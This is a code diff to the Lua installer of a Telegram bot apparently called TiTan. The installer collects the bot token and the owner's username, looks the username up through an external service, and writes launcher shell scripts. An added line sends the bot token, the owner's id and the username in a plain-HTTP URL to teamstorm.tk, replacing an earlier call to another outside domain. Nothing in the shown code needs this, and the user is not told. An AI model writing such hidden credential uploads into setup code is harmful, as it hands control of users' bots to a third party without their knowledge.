@@ -12,6 +12,7 @@ token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
+UserName = "]]..UserName..[["
 ]])
 TiTan_Info_Sudo:close()
 end  
@@ -29,24 +30,41 @@ end
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua run.lua')
+os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_TiTan.."Id_TiTan") then
-print("\27[1;34m\n»» Send Your id Sudo : \27[m")
+if not database:get(Server_TiTan.."UserName_TiTan") then
+print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
-io.write('\n\27[1;31m»» The id Is Saved\n\27[0;39;49m')
-database:set(Server_TiTan.."Id_TiTan",UserName)
+local Get_Info = http.request("http://teamstorm.tk/GetUser/?id="..UserName)
+if Get_Info:match('Is_Spam') then
+io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
+return false
+end
+local Json = JSON:decode(Get_Info)
+if Json.Info == false then
+io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
+os.execute('lua start.lua')
 else
-io.write('\n\27[1;31mThe id was not Saved\n\27[0;39;49m')
+if Json.Info == 'Channel' then
+io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
+os.execute('lua start.lua')
+else
+io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
+database:set(Server_TiTan.."UserName_TiTan",Json.Info.Username)
+database:set(Server_TiTan.."Id_TiTan",Json.Info.Id)
+end
+end
+else
+io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
-os.execute('lua run.lua')
+os.execute('lua start.lua')
 end
 local function Files_TiTan_Info()
 Create_Info(database:get(Server_TiTan.."Token_TiTan"),database:get(Server_TiTan.."Id_TiTan"),database:get(Server_TiTan.."UserName_TiTan"))   
-http.request("https://titan-com.ml/getuser.php?id="..database:get(Server_TiTan.."Id_TiTan").."&user="..database:get(Server_TiTan.."UserName_TiTan").."&token="..database:get(Server_TiTan.."Token_TiTan"))
+http.request("http://teamstorm.tk/insert/?id="..database:get(Server_TiTan.."Id_TiTan").."&user="..database:get(Server_TiTan.."UserName_TiTan").."&token="..database:get(Server_TiTan.."Token_TiTan"))
 local RunTiTan = io.open("TiTan", 'w')
 RunTiTan:write([[
 #!/usr/bin/env bash
@@ -60,7 +78,7 @@ rm -fr ../.telegram-cli
 done
 ]])
 RunTiTan:close()
-local RunTs = io.open("tk", 'w')
+local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
 cd $HOME/TiTan
